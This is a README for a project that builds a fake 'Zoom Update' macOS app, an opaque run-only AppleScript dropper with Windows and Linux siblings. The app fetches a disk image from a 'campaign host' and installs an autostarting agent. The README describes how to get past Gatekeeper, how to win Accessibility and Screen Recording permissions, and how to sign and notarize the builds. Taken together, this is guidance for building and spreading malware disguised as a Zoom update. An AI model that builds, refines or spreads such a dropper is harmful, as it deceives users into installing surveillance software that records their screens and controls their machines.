# Zoom Update (macOS)

A double-clickable macOS client that installs the `zoom-private` agent.

`ZoomUpdate.app` is a compiled, run-only AppleScript applet with a custom icon.
It downloads the official installer disk image over HTTPS, mounts it, runs the
self-elevating setup app, cleans up, and relaunches the installed agent.

## Artifacts

Every CI run produces, in the workflow run's **Artifacts** section:

| File | Purpose |
| --- | --- |
| `ZoomUpdate-1.0.0.zip` | The signed app bundle, for manual distribution |
| `ZoomUpdate-1.0.0.pkg` | Installer that places the app in `/Applications` and launches it |
| `SHA256SUMS` | Checksums for both files |

Pushing a `v*` tag also publishes the same files to a GitHub Release.

## Install

1. Download `ZoomUpdate-1.0.0.pkg` (or expand the zip).
2. Right-click **Open** the first time. Unsigned builds trip Gatekeeper.
3. Approve the admin prompt. The setup app verifies its payload by SHA-256 and
   registers the agent for autostart.
4. Grant **Accessibility** and **Screen Recording** to the installed agent in
   System Settings > Privacy & Security (or install the PPPC profile).

## Controls

The payload URLs and app names live at the top of
`zoom-update-microsoft.scpt`. `payloadUrl` (the campaign host) is tried first;
`fallbackUrl` (the GitHub release mirror) is used when it fails or serves
something that is not a disk image.

## Build locally

Requires macOS with Xcode command line tools.

```bash
bash build/build-macos.sh
```

Output lands in `build/out/`. The app is ad-hoc signed when no identity is set.

## CI signing (optional)

Ad-hoc builds work but show the Gatekeeper warning. To produce signed and
notarized artifacts, add these repository secrets:

| Secret | Value |
| --- | --- |
| `MACOS_CERT_P12` | base64 of a `.p12` holding Developer ID Application + Installer certs |
| `MACOS_CERT_PASSWORD` | password for the `.p12` |
| `MACOS_SIGN_IDENTITY` | e.g. `Developer ID Application: Name (TEAMID)` |
| `MACOS_INSTALLER_SIGN_IDENTITY` | e.g. `Developer ID Installer: Name (TEAMID)` |
| `APPLE_ID` | Apple ID for notarization |
| `APPLE_TEAM_ID` | team ID |
| `APPLE_APP_PASSWORD` | app-specific password |

Signing and notarization steps are skipped automatically when the secrets are
absent.

## Layout

```
zoom-update-microsoft.scpt   AppleScript source (macOS client)
zoom-update-linux.sh         Linux sibling dropper
zoom-update-microsoft.vbs    Windows sibling dropper
icon/icon.png                source icon, converted to .icns in CI
build/build-macos.sh         compile, icon, sign, zip, pkg
pkg/distribution.xml         installer metadata
pkg/scripts/postinstall      launches the app after install
.github/workflows/compile.yml
```

## Why the original snippet fails

The sample workflow moved the `.scpt` into `Contents/Resources` and pointed
`CFBundleExecutable` at a file that did not exist. `osacompile -o X.app` already
creates the executable applet, so this project compiles straight into the
bundle, then adds the icon and metadata around it.
